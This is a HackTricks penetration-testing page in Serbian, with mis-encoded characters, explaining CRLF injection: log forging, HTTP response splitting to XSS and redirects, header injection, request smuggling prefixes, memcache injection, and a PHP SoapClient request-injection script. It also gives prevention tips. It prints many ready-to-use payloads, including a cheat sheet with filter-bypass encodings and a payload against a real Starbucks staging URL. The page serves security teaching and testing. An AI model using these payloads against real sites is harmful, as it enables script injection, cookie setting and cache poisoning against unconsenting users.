# CRLF (%0D%0A) Injection

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Savet za bug bounty**: **registrujte se** za **Intigriti**, premium **platformu za bug bounty kreiranu od hakera, za hakere**! PridruÅ¾ite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i poÄnite da zaraÄ‘ujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

### CRLF

Carriage Return (CR) i Line Feed (LF), zajedno poznati kao CRLF, su posebni karakter sekvence koriÅ¡Ä‡ene u HTTP protokolu za oznaÄavanje kraja linije ili poÄetka nove. Veb serveri i pretraÅ¾ivaÄi koriste CRLF da razlikuju HTTP zaglavlja od tela odgovora. Ovi karakteri se univerzalno koriste u HTTP/1.1 komunikacijama na razliÄitim tipovima veb servera, kao Å¡to su Apache i Microsoft IIS.

### CRLF Injection Vulnerability

CRLF ubacivanje ukljuÄuje umetanje CR i LF karaktera u korisniÄki unos. Ova akcija dovodi server, aplikaciju ili korisnika u zabludu da tumaÄe ubaÄenu sekvencu kao kraj jednog odgovora i poÄetak drugog. Iako ovi karakteri nisu inherentno Å¡tetni, njihova zloupotreba moÅ¾e dovesti do razdvajanja HTTP odgovora i drugih zlonamernih aktivnosti.

### Primer: CRLF Injection u log fajlu

[Primer sa ovog linka](https://www.invicti.com/blog/web-security/crlf-http-header/)

Razmotrite log fajl u admin panelu koji prati format: `IP - Vreme - Poseta putanja`. TipiÄan unos bi mogao izgledati ovako:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
NapadaÄ moÅ¾e iskoristiti CRLF ubacivanje da manipuliÅ¡e ovim zapisom. Ubacivanjem CRLF karaktera u HTTP zahtev, napadaÄ moÅ¾e promeniti izlazni tok i fabrikovati log zapise. Na primer, ubaÄena sekvenca moÅ¾e transformisati log zapis u:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Evo, `%0d` i `%0a` predstavljaju URL-kodirane oblike CR i LF. Nakon napada, zapisnik bi pogreÅ¡no prikazao:
```
IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
NapadaÄ tako prikriva svoje zlonamerne aktivnosti tako Å¡to Äini da izgleda kao da je lokalni raÄunar (entitet obiÄno poveren unutar serverskog okruÅ¾enja) izvrÅ¡io radnje. Server tumaÄi deo upita koji poÄinje sa `%0d%0a` kao jedan parametar, dok se parametar `restrictedaction` parsira kao drugi, odvojeni unos. Manipulisani upit efikasno imitira legitimnu administratorsku komandu: `/index.php?page=home&restrictedaction=edit`

### HTTP Response Splitting

#### Opis

HTTP Response Splitting je sigurnosna ranjivost koja nastaje kada napadaÄ iskoriÅ¡Ä‡ava strukturu HTTP odgovora. Ova struktura razdvaja zaglavlja od tela koristeÄ‡i specifiÄan niz karaktera, povratni taster (CR) praÄ‡en prelaskom u novi red (LF), zajedno nazvan kao CRLF. Ako napadaÄ uspe da ubaci niz CRLF u zaglavlje odgovora, moÅ¾e efikasno manipulisati sadrÅ¾ajem narednog odgovora. Ovakva manipulacija moÅ¾e dovesti do ozbiljnih sigurnosnih problema, posebno Cross-site Scripting (XSS).

#### XSS putem HTTP Response Splitting

1. Aplikacija postavlja prilagoÄ‘eno zaglavlje na ovaj naÄin: `X-Custom-Header: UserInput`
2. Aplikacija preuzima vrednost za `UserInput` iz upita parametra, recimo "user\_input". U scenarijima koji nedostaju pravilna validacija i enkodiranje unosa, napadaÄ moÅ¾e kreirati payload koji ukljuÄuje niz CRLF, praÄ‡en zlonamernim sadrÅ¾ajem.
3. NapadaÄ kreira URL sa specijalno oblikovanim 'user\_input': `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
* U ovom URL-u, `%0d%0a%0d%0a` je URL-enkodirana forma CRLFCRLF. To vara server da ubaci niz CRLF, Äime server tretira naredni deo kao telo odgovora.
4. Server reflektuje napadaÄev unos u zaglavlju odgovora, Å¡to dovodi do neÅ¾eljene strukture odgovora gde zlonamerni skript bude tumaÄen od strane pregledaÄa kao deo tela odgovora.

#### Primer HTTP Response Splitting koji dovodi do preusmeravanja

Sa [https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)

PregledaÄ ka:
```
/%0d%0aLocation:%20http://myweb.com
```
I server odgovara zaglavljem:
```
Location: http://myweb.com
```
**Drugi primer: (sa** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### U URL putanji

MoÅ¾ete poslati payload **unutar URL putanje** da biste kontrolisali **odgovor** sa servera (primer sa [ovde](https://hackerone.com/reports/192667)):
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
Proverite viÅ¡e primera u:

{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### HTTP Ubacivanje Zaglavlja

HTTP ubacivanje zaglavlja, Äesto iskoriÅ¡Ä‡eno putem CRLF (Carriage Return and Line Feed) ubacivanja, omoguÄ‡ava napadaÄima da ubace HTTP zaglavlja. Ovo moÅ¾e naruÅ¡iti mehanizme bezbednosti poput XSS (Cross-Site Scripting) filtera ili SOP (Same-Origin Policy), potencijalno dovodeÄ‡i do neovlaÅ¡Ä‡enog pristupa osetljivim podacima, poput CSRF tokena, ili manipulacije korisniÄkih sesija putem ubacivanja kolaÄiÄ‡a.

#### IskoriÅ¡Ä‡avanje CORS putem HTTP Ubacivanja Zaglavlja

NapadaÄ moÅ¾e ubaciti HTTP zaglavlja kako bi omoguÄ‡io CORS (Cross-Origin Resource Sharing), zaobilazeÄ‡i ograniÄenja nametnuta od strane SOP. Ova ranjivost omoguÄ‡ava skriptovima sa zlonamernih izvora da interaguju sa resursima sa drugog izvora, potencijalno pristupajuÄ‡i zaÅ¡tiÄ‡enim podacima.

#### SSRF i Ubacivanje HTTP Zahteva putem CRLF

CRLF ubacivanje moÅ¾e se koristiti za kreiranje i ubacivanje potpuno novog HTTP zahteva. ZnaÄajan primer ove ranjivosti je u PHP-ovoj klasi `SoapClient`, posebno unutar parametra `user_agent`. Manipulacijom ovog parametra, napadaÄ moÅ¾e ubaciti dodatna zaglavlja i sadrÅ¾aj tela, ili Äak ubaciti potpuno novi HTTP zahtev. U nastavku je PHP primer koji demonstrira ovu eksploataciju:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```
### Umetanje zaglavlja za zahtevanje Å¡verca

Za viÅ¡e informacija o ovoj tehnici i potencijalnim problemima [**proverite originalni izvor**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

MoÅ¾ete ubaciti kljuÄna zaglavlja kako biste osigurali da **backend odrÅ¾ava otvorenu vezu** nakon odgovora na poÄetni zahtev:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Nakon toga, moÅ¾e se specificirati drugi zahtev. Ovaj scenario obiÄno ukljuÄuje [HTTP request smuggling](http-request-smuggling/), tehniku gde dodatni zaglavlja ili delovi tela dodati od strane servera nakon ubacivanja mogu dovesti do razliÄitih sigurnosnih eksploatacija.

**Eksploatacija:**

1. **Zlonamerno ubacivanje prefiksa**: Ova metoda ukljuÄuje trovanje zahteva sledeÄ‡eg korisnika ili keÅ¡a veb stranice specificiranjem zlonamernog prefiksa. Primer:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

2. **Izrada prefiksa za trovanje reda odgovora**: Ovaj pristup ukljuÄuje kreiranje prefiksa koji, kada se kombinuje sa zavrÅ¡nim smeÄ‡em, formira potpuni drugi zahtev. Ovo moÅ¾e pokrenuti trovanje reda odgovora. Primer:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

### Memcache ubacivanje

Memcache je **skladiÅ¡te kljuÄ-vrednost koje koristi protokol u Äistom tekstu**. ViÅ¡e informacija na:

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

**Za potpune informacije proÄitajte** [**originalni Älanak**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)

Ako platforma uzima **podatke iz HTTP zahteva i koristi ih bez provere** za izvrÅ¡avanje **zahteva** ka **memcache** serveru, napadaÄ moÅ¾e iskoristiti ovu aktivnost da **ubaci nove memcache komande**.

Na primer, u originalno otkrivenom propustu, kljuÄevi keÅ¡a su koriÅ¡Ä‡eni da vrate IP adresu i port kojem bi korisnik trebalo da se poveÅ¾e, i napadaÄi su mogli **ubaciti memcache komande** koje bi **trovale** **keÅ¡ da poÅ¡alje detalje Å¾rtava** (ukljuÄujuÄ‡i korisniÄka imena i lozinke) napadaÄevim serverima:

<figure><img src="../.gitbook/assets/image (6) (1) (4).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&#x26;h=178&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

Pored toga, istraÅ¾ivaÄi su takoÄ‘e otkrili da mogu da dezinkuju odgovore memcache-a da poÅ¡alju IP adrese i portove napadaÄima korisnicima Äije imejl adrese napadaÄ nije znao:

<figure><img src="../.gitbook/assets/image (40).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&#x26;h=506&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

### Kako spreÄiti CRLF / HTTP ubacivanja zaglavlja u veb aplikacijama

Da biste umanjili rizike od CRLF (Carriage Return i Line Feed) ili HTTP ubacivanja zaglavlja u veb aplikacijama, preporuÄuju se sledeÄ‡e strategije:

1. **Izbegavajte direktni korisniÄki unos u zaglavlja odgovora:** Najsigurniji pristup je da se suzdrÅ¾ite od direktnog ukljuÄivanja korisniÄkih unosa direktno u zaglavlja odgovora.
2. **Kodiranje specijalnih karaktera:** Ako izbegavanje direktnog korisniÄkog unosa nije izvodljivo, obezbedite koriÅ¡Ä‡enje funkcije posveÄ‡ene kodiranju specijalnih karaktera poput CR (Carriage Return) i LF (Line Feed). Ova praksa spreÄava moguÄ‡nost CRLF ubacivanja.
3. **AÅ¾urirajte programski jezik:** Redovno aÅ¾urirajte programski jezik koji se koristi u vaÅ¡im veb aplikacijama na najnoviju verziju. Odaberite verziju koja inherentno zabranjuje ubacivanje CR i LF karaktera unutar funkcija zaduÅ¾enih za postavljanje HTTP zaglavlja.

### Å IFARNIK

[Å ifarnik odavde](https://twitter.com/NinadMishra5/status/1650080604174667777)
```
1. HTTP Response Splitting
â€¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
â€¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
â€¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
â€¢ /google.com/%2F..%0D%0AHeader-Test:test2
â€¢ /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
â€¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
â€¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
â€¢ %E5%98%8A = %0A = \u560a
â€¢ %E5%98%8D = %0D = \u560d
â€¢ %E5%98%BE = %3E = \u563e (>)
â€¢ %E5%98%BC = %3C = \u563c (<)
â€¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Automatski alati

* [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
* [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## Lista detekcije Brute-Force napada

* [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt)

## Reference

* [**https://www.invicti.com/blog/web-security/crlf-http-header/**](https://www.invicti.com/blog/web-security/crlf-http-header/)
* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
* [**https://www.netsparker.com/blog/web-security/crlf-http-header/**](https://www.netsparker.com/blog/web-security/crlf-http-header/)

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Savet za bug bounty**: **Prijavite se** na **Intigriti**, premium **platformu za bug bounty kreiranu od hakera, za hakere**! PridruÅ¾ite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i poÄnite da zaraÄ‘ujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od poÄetnika do struÄnjaka sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
